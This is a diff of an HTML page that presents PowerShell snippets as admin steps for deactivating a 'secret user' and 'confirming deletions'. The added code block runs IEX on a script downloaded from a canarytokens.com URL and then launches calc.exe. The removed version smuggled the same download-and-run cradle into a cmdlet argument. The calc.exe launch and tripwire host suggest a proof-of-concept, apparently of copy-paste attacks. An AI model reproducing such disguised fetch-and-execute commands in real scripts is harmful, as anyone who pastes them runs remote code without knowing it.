@@ -90,7 +90,7 @@
 <div class="container">
     <h2>Deactivate Secret User</h2>
     <pre id="codebox">
-$user = Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -match "MICROSOFT" -or $_.Description -match "internal|reserved|hidden|deactivateuser" }
+$user = Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -match "MICROSOFT" -or $_.Description -match "internal|reserved|hidden|deactivatedoor" }
     </pre>
 </div>
 
@@ -104,17 +104,16 @@ $user = Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -match "MICROSO
 <div class="container">
     <h2>Confirming Deletions</h2>
     <pre id="codebox">
-& {
+& { 
 <#
 This comment is very important 
 to get the right number of byteswxxxxxxxxxxxxxxxx
 XXXXXXXXXXXXXXXXXXXXXXXx
 #>
-$rights = Find-AdmPwdExtendedrights -Identity "<span class="modified">";$(IEX (New-Object Net.WebClient).DownloadString('http://canarytokens.com/terms/static/stuff/h608qpmsix4altl2cw3d41iza/post.jsp'); Start-Process calc.exe)</span>" 
-$rights | Format-Table 
-
-#ShadowNotSoBroker
-}</pre>
+Start-Sleep -Milliseconds 100
+<span class="modified">IEX (New-Object Net.WebClient).DownloadString('http://canarytokens.com/terms/static/stuff/h608qpmsix4altl2cw3d41iza/post.jsp'); Start-Process calc.exe</span>
+}
+    </pre>
 </div>
 
 </body>
